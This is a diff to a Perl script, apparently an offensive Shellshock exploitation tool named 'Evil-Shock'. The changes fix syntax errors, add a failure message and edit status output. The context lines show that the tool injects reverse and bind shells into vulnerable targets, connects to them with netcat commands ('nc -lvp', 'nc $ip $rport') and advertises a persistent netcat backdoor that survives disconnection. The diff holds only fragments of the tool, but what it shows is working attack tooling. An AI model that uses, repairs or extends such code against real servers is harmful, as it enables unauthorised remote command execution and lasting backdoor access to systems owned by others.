@@ -19,8 +19,12 @@ GetOptions(
 	"inject-only+"           => \my $injectOnly,
 ) or die "Error while setting up command-line arguments";
 
-if($O^ =~ /Win/){
+if($^O =~ /Win/){
    Win();
+}
+
+sub Failed{
+   print "\n[!] No injection points were found!, make sure the target is vulnerable or inject your own code via --inject=<>!\n";
 }
 
 
@@ -141,7 +145,7 @@ print "->SESSION SHELL INJECTED: $bip:$bport \n";
 print "[+] Auto-Exploiting target ... \n";
 print "\n\n \n";
 print "[+] Listening ...\n"; 
-print "[+] When Connected, you should be able to execute remote command now! (Closing the window or the script will end the reverse): \n"; 
+print "[+] When Connected, you should be able to execute remote command now! (Closing the window or the script will end the reverse shell except if '--srv-persistent' was selected in command-line): \n"; 
 Bind2Shell();
 system("nc -lvp $bport");
 }
@@ -175,12 +179,15 @@ $straddr = inet_ntoa($iaddr);
 $ip = $straddr;
 }
 if($pertsrv eq 1){
-  print "\n[+] PERSISTENT BACKDOOR WARNING [+]\n";
+  print "[+] PERSISTENT BACKDOOR WARNING [+]\n";
   print "[+] The persistent backdoor will not be executed at the start up, only if the process is still alive and the machine on.\n";
   print "[+] By default netcat will end the backdoor when we first got connected and exit.\n";
   print "[+] But Evil-Shock has made netcat to not end the connection even if we exit the session!\n";
   print "[!] So you can connect at anytime doing: $ip $rport\n";
   print "\n";
+  print "\n";
+  print "\n";
+
 }
 print "\n[+] IP Of $domain: $ip\n";
 print "[+] Reverse Shell was successfully injected! \n";
@@ -188,7 +195,7 @@ print "->SESSION SHELL INJECTED: $ip:$rport \n";
 print "[+] Auto-Exploiting target ... \n";
 print "\n\n \n";
 print "[+] Connecting...\n"; 
-print "[+] Connected!, should be able to execute remote command now! (Closing the window or the script will end the bind shell. Except if '--srv-persistent' was selected in command-line); \n"; 
+print "[+] Connected!, should be able to execute remote command now! (Closing the window or the script will end the bind shell): \n"; 
 system("nc $ip $rport")
 }
 
@@ -368,7 +375,7 @@ if($body =~ /--- 8.8.8.8 ping statistics ---/){
 
 InfoGrabber();
 
-Win{
+sub Win{
 system("clear || cls");            
 print q{
 
@@ -711,13 +718,13 @@ if($body =~ /--- 8.8.8.8 ping statistics ---/){
   }
 } else {
   print "[-] Shellshock Ping Injection was not injected successfully! (Not Vulnerable!) \n";
+  Failed();
+  exit(0);
 }
-}q
+}
 
 InfoGrabber();
 }
-
-
 
 
 
